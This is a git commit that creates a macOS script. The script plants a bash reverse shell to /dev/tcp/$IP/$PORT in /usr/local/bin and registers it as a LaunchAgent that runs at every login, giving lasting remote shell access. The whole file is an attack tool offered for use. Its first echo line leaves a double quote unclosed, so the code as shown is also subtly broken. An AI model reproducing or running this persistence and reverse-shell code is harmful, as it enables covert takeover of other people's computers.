670ce12c4380828ddde2782a3425b1551287b839
4lpndev <155200702+4lpndev@users.noreply.github.com>
2024-10-15 15:14:28 +0200

    Create runonstartupMACOS.sh

---
+++ runonstartupMACOS.sh
@@ -0,0 +1,28 @@
+echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &' > /usr/local/bin/runonstartupMACOS.sh
+
+touch ~/Library/LaunchAgents/com.4lpndev.strt.plist
+
+echo '
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+  <dict>
+    <key>Label</key>
+    <string>com.4lpndev.strt.plist</string>
+    <key>ProgramArguments</key>
+    <array>
+      <string>/usr/local/bin/runonstartupMACOS.sh</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/tmp/mylogfile.log</string>
+    <key>StandardErrorPath</key>
+    <string>/tmp/myerrorlogfile.log</string>
+  </dict>
+</plist>
+' > ~/Library/LaunchAgents/com.4lpndev.strt.plist
+
+launchctl load ~/Library/LaunchAgents/com.4lpndev.strt.plist
+
+launchctl start com.4lpndev.strt.plist
